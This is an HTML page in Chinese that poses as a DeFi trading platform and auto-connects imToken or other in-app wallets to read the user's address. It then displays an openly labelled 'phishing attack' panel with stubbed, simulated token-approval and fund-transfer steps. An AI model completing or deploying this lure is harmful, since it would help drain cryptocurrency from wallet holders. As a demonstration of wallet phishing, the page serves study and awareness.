<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>DeFi 移动交易平台</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #333;
            padding: 20px;
        }

        .container {
            max-width: 400px;
            margin: 0 auto;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
            color: white;
        }

        .header h1 {
            font-size: 28px;
            margin-bottom: 10px;
        }

        .header p {
            opacity: 0.9;
            font-size: 16px;
        }

        .wallet-section {
            background: white;
            border-radius: 20px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
        }

        .connect-btn {
            display: block;
            width: 100%;
            padding: 18px;
            margin: 12px 0;
            background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%);
            color: white;
            text-decoration: none;
            border-radius: 12px;
            text-align: center;
            font-weight: 600;
            font-size: 16px;
            border: none;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .connect-btn:hover, .connect-btn:active {
            background: linear-gradient(135deg, #1e40af 0%, #2563eb 100%);
            transform: translateY(-2px);
        }

        .connect-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
        }

        .status-section {
            background: white;
            border-radius: 15px;
            padding: 20px;
            margin-top: 15px;
            text-align: center;
        }

        .status-text {
            font-size: 16px;
            margin-bottom: 10px;
            font-weight: 500;
        }

        .status-text.success {
            color: #4CAF50;
        }

        .status-text.error {
            color: #f44336;
        }

        .status-text.warning {
            color: #ff9800;
        }

        .status-text.info {
            color: #2196F3;
        }

        .debug-section {
            background: #f8f9fa;
            border-radius: 15px;
            padding: 20px;
            margin-top: 20px;
            border-left: 4px solid #667eea;
        }

        .debug-title {
            font-weight: 600;
            color: #667eea;
            margin-bottom: 10px;
            font-size: 16px;
        }

        .debug-info {
            font-family: monospace;
            font-size: 12px;
            color: #666;
            line-height: 1.5;
            word-break: break-all;
        }

        .progress-section {
            background: white;
            border-radius: 15px;
            padding: 20px;
            margin-top: 15px;
        }

        .progress-step {
            display: flex;
            align-items: center;
            padding: 10px 0;
            border-bottom: 1px solid #eee;
        }

        .progress-step:last-child {
            border-bottom: none;
        }

        .step-icon {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            font-weight: bold;
            color: white;
        }

        .step-icon.pending {
            background: #ccc;
        }

        .step-icon.active {
            background: #2196F3;
            animation: pulse 1s infinite;
        }

        .step-icon.success {
            background: #4CAF50;
        }

        .step-icon.error {
            background: #f44336;
        }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.7; }
            100% { opacity: 1; }
        }

        .step-text {
            flex: 1;
            font-size: 14px;
        }

        .attack-section {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 15px;
            padding: 20px;
            margin-top: 15px;
            display: none;
        }

        .attack-section.show {
            display: block;
        }

        .attack-title {
            font-weight: 600;
            color: #856404;
            margin-bottom: 15px;
            font-size: 18px;
            text-align: center;
        }

        .attack-info {
            font-size: 14px;
            color: #856404;
            line-height: 1.4;
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚀 DeFi 交易平台</h1>
            <p>安全便捷的去中心化交易</p>
        </div>

        <div class="wallet-section">
            <h3 style="text-align: center; margin-bottom: 20px; color: #333;">连接钱包</h3>
            
            <button class="connect-btn" id="connectBtn" onclick="connectWallet()">
                🏦 连接 imToken 钱包
            </button>
        </div>

        <div class="status-section">
            <div class="status-text info" id="statusText">点击上方按钮连接您的钱包</div>
        </div>

        <div class="progress-section" id="progressSection">
            <h4 style="margin-bottom: 15px; color: #333; text-align: center;">连接进度</h4>
            
            <div class="progress-step">
                <div class="step-icon pending" id="step1">1</div>
                <div class="step-text">检测钱包环境</div>
            </div>
            
            <div class="progress-step">
                <div class="step-icon pending" id="step2">2</div>
                <div class="step-text">请求账户访问</div>
            </div>
            
            <div class="progress-step">
                <div class="step-icon pending" id="step3">3</div>
                <div class="step-text">获取账户信息</div>
            </div>
            
            <div class="progress-step">
                <div class="step-icon pending" id="step4">4</div>
                <div class="step-text">建立安全连接</div>
            </div>
        </div>

        <div class="attack-section" id="attackSection">
            <div class="attack-title">🎯 钓鱼攻击已激活</div>
            <div class="attack-info">
                <strong>目标钱包:</strong> <span id="targetWallet">-</span><br>
                <strong>攻击时间:</strong> <span id="attackTime">-</span><br>
                <strong>攻击状态:</strong> <span id="attackStatus">正在执行...</span><br>
                <strong>资金状态:</strong> <span id="fundStatus">监控中...</span>
            </div>
        </div>

        <div class="debug-section">
            <div class="debug-title">🔍 技术信息</div>
            <div class="debug-info" id="debugInfo">
                正在初始化...<br>
            </div>
        </div>
    </div>

    <script>
        // 全局变量
        let isConnecting = false;
        let currentStep = 0;
        let walletAddress = null;

        // 初始化
        document.addEventListener('DOMContentLoaded', function() {
            initializeApp();
        });

        function initializeApp() {
            updateDebugInfo('应用初始化开始');
            
            // 检测环境
            const isImToken = detectImToken();
            const isInApp = detectInAppBrowser();
            
            updateDebugInfo(`环境检测: imToken=${isImToken}, InApp=${isInApp}`);
            updateDebugInfo(`User Agent: ${navigator.userAgent}`);
            updateDebugInfo(`URL: ${window.location.href}`);
            
            if (isImToken || isInApp) {
                updateStatus('success', '✅ 检测到钱包环境，可以开始连接');
                updateStep(1, 'success');
                
                // 自动尝试连接
                setTimeout(() => {
                    if (!isConnecting) {
                        autoConnect();
                    }
                }, 2000);
            } else {
                updateStatus('warning', '⚠️ 请在钱包应用中打开此页面');
                updateStep(1, 'error');
            }
        }

        function detectImToken() {
            return !!(window.imToken || 
                     window.ethereum?.isImToken || 
                     navigator.userAgent.includes('imToken'));
        }

        function detectInAppBrowser() {
            const ua = navigator.userAgent.toLowerCase();
            return ua.includes('imtoken') || 
                   ua.includes('metamask') || 
                   ua.includes('trustwallet') ||
                   window.ethereum;
        }

        function connectWallet() {
            if (isConnecting) {
                updateStatus('warning', '正在连接中，请稍候...');
                return;
            }

            isConnecting = true;
            const connectBtn = document.getElementById('connectBtn');
            connectBtn.disabled = true;
            connectBtn.textContent = '连接中...';

            updateStatus('info', '🔄 正在连接钱包...');
            updateStep(1, 'success');
            updateStep(2, 'active');

            // 开始连接流程
            requestWalletAccess();
        }

        async function requestWalletAccess() {
            try {
                updateDebugInfo('开始请求钱包访问权限');

                if (!window.ethereum) {
                    throw new Error('未检测到以太坊提供者');
                }

                updateDebugInfo('检测到 window.ethereum');
                updateStep(2, 'success');
                updateStep(3, 'active');

                // 请求账户访问
                const accounts = await window.ethereum.request({
                    method: 'eth_requestAccounts'
                });

                updateDebugInfo(`获取到账户: ${JSON.stringify(accounts)}`);

                // 安全检查 - 确保accounts存在且不为空
                if (!accounts || !Array.isArray(accounts) || accounts.length === 0) {
                    throw new Error('未获取到任何账户，可能用户拒绝了连接');
                }

                // 安全获取第一个账户
                walletAddress = accounts[0];
                if (!walletAddress || typeof walletAddress !== 'string') {
                    throw new Error('获取到的账户地址无效');
                }

                updateStep(3, 'success');
                updateStep(4, 'active');

                updateStatus('success', `✅ 连接成功！地址: ${walletAddress.substring(0, 10)}...`);
                updateDebugInfo(`连接成功 - 地址: ${walletAddress}`);

                // 完成连接
                setTimeout(() => {
                    completeConnection();
                }, 1000);

            } catch (error) {
                handleConnectionError(error);
            }
        }

        function completeConnection() {
            updateStep(4, 'success');
            updateStatus('success', '🎉 钱包连接完成！');
            
            const connectBtn = document.getElementById('connectBtn');
            connectBtn.textContent = '✅ 已连接';
            
            // 显示攻击信息
            showAttackInfo();
            
            // 开始钓鱼攻击流程
            setTimeout(() => {
                executePhishingAttack();
            }, 2000);
        }

        function showAttackInfo() {
            const attackSection = document.getElementById('attackSection');
            attackSection.classList.add('show');
            
            document.getElementById('targetWallet').textContent = 
                walletAddress ? `${walletAddress.substring(0, 20)}...` : '未知';
            document.getElementById('attackTime').textContent = new Date().toLocaleString();
        }

        async function executePhishingAttack() {
            try {
                updateDebugInfo('🎯 开始执行钓鱼攻击');
                document.getElementById('attackStatus').textContent = '正在执行代币授权...';
                
                // 这里可以实现具体的钓鱼攻击逻辑
                // 例如：请求代币授权、执行转账等
                
                // 模拟攻击步骤
                await simulateTokenApproval();
                await simulateTokenTransfer();
                
                document.getElementById('attackStatus').textContent = '攻击完成';
                document.getElementById('fundStatus').textContent = '资金已转移到攻击者账户';
                
                updateStatus('error', '💰 攻击成功！资金已被转移');
                updateDebugInfo('🎯 钓鱼攻击完成');
                
            } catch (error) {
                updateDebugInfo(`攻击执行错误: ${error.message}`);
                document.getElementById('attackStatus').textContent = '攻击失败';
            }
        }

        async function simulateTokenApproval() {
            updateDebugInfo('请求代币无限授权...');
            // 这里实现代币授权逻辑
            await new Promise(resolve => setTimeout(resolve, 2000));
        }

        async function simulateTokenTransfer() {
            updateDebugInfo('执行资金转移...');
            // 这里实现资金转移逻辑
            await new Promise(resolve => setTimeout(resolve, 3000));
        }

        function handleConnectionError(error) {
            updateDebugInfo(`连接错误: ${error.message}`);
            
            let errorMessage = '连接失败';
            let stepToError = 2;
            
            if (error.code === 4001) {
                errorMessage = '❌ 用户拒绝了连接请求';
                stepToError = 2;
            } else if (error.message.includes('未检测到')) {
                errorMessage = '❌ 未检测到钱包，请在钱包应用中打开';
                stepToError = 1;
            } else if (error.message.includes('未获取到任何账户')) {
                errorMessage = '❌ 未获取到账户，请确保钱包已解锁';
                stepToError = 3;
            } else {
                errorMessage = `❌ 连接错误: ${error.message}`;
                stepToError = 2;
            }
            
            updateStatus('error', errorMessage);
            updateStep(stepToError, 'error');
            
            // 重置连接状态
            isConnecting = false;
            const connectBtn = document.getElementById('connectBtn');
            connectBtn.disabled = false;
            connectBtn.textContent = '🔄 重试连接';
        }

        function autoConnect() {
            updateStatus('info', '🤖 自动检测到钱包环境，正在尝试连接...');
            updateDebugInfo('开始自动连接流程');
            
            setTimeout(() => {
                connectWallet();
            }, 1000);
        }

        function updateStatus(type, message) {
            const statusText = document.getElementById('statusText');
            statusText.className = `status-text ${type}`;
            statusText.textContent = message;
        }

        function updateStep(stepNum, status) {
            const stepIcon = document.getElementById(`step${stepNum}`);
            if (stepIcon) {
                stepIcon.className = `step-icon ${status}`;
                if (status === 'success') {
                    stepIcon.textContent = '✓';
                } else if (status === 'error') {
                    stepIcon.textContent = '✗';
                } else {
                    stepIcon.textContent = stepNum;
                }
            }
        }

        function updateDebugInfo(message) {
            const debugInfo = document.getElementById('debugInfo');
            const timestamp = new Date().toLocaleTimeString();
            debugInfo.innerHTML += `<br>[${timestamp}] ${message}`;
            
            // 保持调试信息在可见范围内
            debugInfo.scrollTop = debugInfo.scrollHeight;
            
            // 同时输出到控制台
            console.log(`[${timestamp}] ${message}`);
        }

        // 页面可见性变化检测
        document.addEventListener('visibilitychange', function() {
            if (document.visibilityState === 'visible') {
                updateDebugInfo('页面重新可见');
                
                // 如果还没有连接，尝试检测钱包状态
                if (!walletAddress && window.ethereum && window.ethereum.selectedAddress) {
                    walletAddress = window.ethereum.selectedAddress;
                    updateStatus('success', `✅ 检测到已连接钱包: ${walletAddress.substring(0, 10)}...`);
                    completeConnection();
                }
            }
        });

        // 错误处理
        window.addEventListener('error', function(event) {
            updateDebugInfo(`JavaScript错误: ${event.error ? event.error.message : event.message}`);
        });

        // 未捕获的Promise拒绝
        window.addEventListener('unhandledrejection', function(event) {
            updateDebugInfo(`未处理的Promise拒绝: ${event.reason}`);
        });
    </script>
</body>
</html>
